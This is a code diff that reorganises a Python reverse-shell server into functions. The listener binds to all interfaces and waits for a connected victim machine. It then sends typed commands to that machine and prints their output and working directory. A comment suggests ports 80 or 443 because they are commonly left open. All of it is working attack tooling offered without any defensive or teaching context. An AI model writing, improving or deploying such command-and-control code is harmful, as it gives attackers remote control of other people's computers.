@@ -1,40 +1,64 @@
 import socket
 
-SERVER_HOST = "0.0.0.0"
+# initialization of variables
+SERVER_HOST = "0.0.0.0" # targets all IPv4 addresseses on local machine
 SERVER_PORT = 5003 #ephermal port number but we should use 80 or 443 as these are popularly opened
 BUFFER_SIZE = 10224 * 128
 SEPARATOR = "<sep>"
 
-socket = socket.socket()
 
-#bind socket to all IP addresses of this host
-socket.bind((SERVER_HOST, SERVER_PORT))
+# creating socket functions
+def initialize_socket():
+    new_socket = socket.socket()
+    new_socket.bind((SERVER_HOST, SERVER_PORT))
+    new_socket.listen(5) #5 is max queue of connections
+    return new_socket
 
-#Listen for connections, 5 is the maximum number of connections supported
-socket.listen(5)
+def accept_connections(socket):
+    client_socket, client_address = socket.accept()
+    print(f"{client_address[0]}:{client_address[1]} Connected!")
+    return client_socket, client_address
 
-#accept connections if there is any
-client_socket, client_address = socket.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+def get_working_directory(client_socket):
+    cwd = client_socket.recv(BUFFER_SIZE).decode() # from client.py
+    print("[+] Current working directory: ", cwd)
+    return cwd
 
-#get working directory of the client
-cwd = client_socket.recv(BUFFER_SIZE).decode()
-print("[+] Current working directory:", cwd)
+# handling command functions from reverse shell
 
-while True:
-    # get the command from prompt
-    command = input(f"{cwd} $> ")
-    if not command.strip():
-        # empty command
-        continue
-    # send the command to the client
-    client_socket.send(command.encode())
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
-    # retrieve command results
-    output = client_socket.recv(BUFFER_SIZE).decode()
-    # split command output and current directory
-    results, cwd = output.split(SEPARATOR)
-    # print output
-    print(results)
+
+
+def handle_command(client_socket, cwd):
+    while True:
+        command = input(f"{cwd} $> ").strip()
+        try:
+                    # Send command to the client
+                    client_socket.send(command.encode())
+                    
+                    # exit loop 
+                    if command.lower() == "exit":
+                        break
+                    # Receive and decode the output from the client
+                    output = client_socket.recv(BUFFER_SIZE).decode()
+                    
+                    # Split the output into results and the updated cwd
+                    try:
+                        results, cwd = output.split(SEPARATOR)
+                    except ValueError:
+                        print("Error processing command output.")
+                        continue  # Skip to the next iteration
+
+                    print(results)
+                
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            break  # Exit the loop on error
+
+def main():
+    socket = initialize_socket()
+    client_socket, client_address = accept_connections(socket)
+    cwd = get_working_directory(client_socket)
+    handle_command(client_socket, cwd)
+
+if __name__ == "__main__":
+            main()
